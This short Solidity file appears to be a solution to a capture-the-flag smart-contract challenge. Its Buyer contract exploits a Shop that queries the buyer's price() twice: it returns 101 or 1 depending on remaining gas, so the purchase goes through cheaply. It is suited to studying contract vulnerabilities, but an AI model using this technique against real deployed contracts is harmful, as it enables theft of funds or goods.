//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface Shop {
    function price() view external returns (uint);
    function isSold() view external returns (bool);
    function buy() external;
}

contract Buyer {

    function buy(address _shop) external {
        Shop(_shop).buy();
    }

    function price() external view returns (uint) {
        // console.log("gas left: %s", gasleft());
        return gasleft() > 6e4 ? 101 : 1;
    }
}
